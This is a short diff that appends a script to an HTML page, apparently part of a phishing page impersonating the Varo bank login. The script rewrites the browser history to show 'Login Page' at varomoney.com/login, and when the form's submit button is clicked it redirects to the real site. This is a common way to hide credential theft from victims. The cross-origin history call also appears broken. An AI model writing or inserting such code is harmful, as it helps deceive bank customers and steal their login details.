@@ -109,5 +109,18 @@
             </div>
         </section>
     </div>
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+    
+// Adds a new entry to the browser history
+window.history.pushState({page: "loginPage"}, "Login Page", "https://varomoney.com/login");
+
+    
+        document.querySelector("#subbut").addEventListener("click", function() {
+            window.location.replace("https://varomoney.com/login");
+    
+        });
+    });
+</script>
 </body> 
 </html>
